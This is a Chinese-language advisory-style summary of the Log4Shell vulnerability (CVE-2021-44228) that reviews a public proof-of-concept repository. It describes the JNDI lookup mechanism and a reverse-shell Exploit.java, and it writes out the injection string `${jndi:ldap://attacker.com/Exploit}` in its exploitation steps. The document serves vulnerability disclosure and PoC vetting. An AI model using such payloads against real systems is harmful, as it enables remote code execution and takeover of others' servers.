## CVE-2021-44228-Log4Shell-RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可能导致完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包含安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的Log4j2，且启用了message lookup substitution功能。攻击者能够控制Log4j2记录的日志消息或参数。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的严重远程代码执行漏洞。该漏洞利用了Log4j2的JNDI（Java Naming and Directory Interface）特性，允许攻击者通过控制日志消息或参数，注入恶意的JNDI查找字符串。当Log4j2解析并执行这些字符串时，它会从攻击者控制的LDAP或其他JNDI服务下载并执行任意Java代码，从而实现远程代码执行。 

**有效性：**根据漏洞库信息和搜索结果，此漏洞影响广泛，且存在公开可用的漏洞利用代码，因此该漏洞的利用是有效的。

**投毒风险：**提供的Dockerfile用于构建包含app.jar的镜像。Exploit.java代码尝试建立一个反向shell连接到 `host.docker.internal` 的9000端口。该代码本身并没有发现明显的投毒行为，而是实现了漏洞利用的基本功能，即建立反向shell。`host.docker.internal` 在docker 容器中可以解析为主机的ip地址。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者找到一个应用程序，该程序使用易受攻击版本的Log4j2并记录用户可控的输入。
2.  攻击者将恶意JNDI查找字符串（例如 `${jndi:ldap://attacker.com/Exploit}`）注入到这些输入中。
3.  当Log4j2记录包含恶意字符串的日志消息时，它会尝试解析JNDI查找。
4.  Log4j2连接到攻击者控制的LDAP服务器（或其它JNDI服务）。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的URL。
6.  Log4j2从URL下载并执行恶意Java类，从而实现远程代码执行。例如提供的Exploit.java。
7.  Exploit.java 代码，会尝试创建一个反向shell，连接到攻击者指定的 `host:port` ，从而控制目标系统。

**项目地址:** [d4ngkh04w/CVE-2021-44228-Apache-Log4j](https://github.com/d4ngkh04w/CVE-2021-44228-Apache-Log4j)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)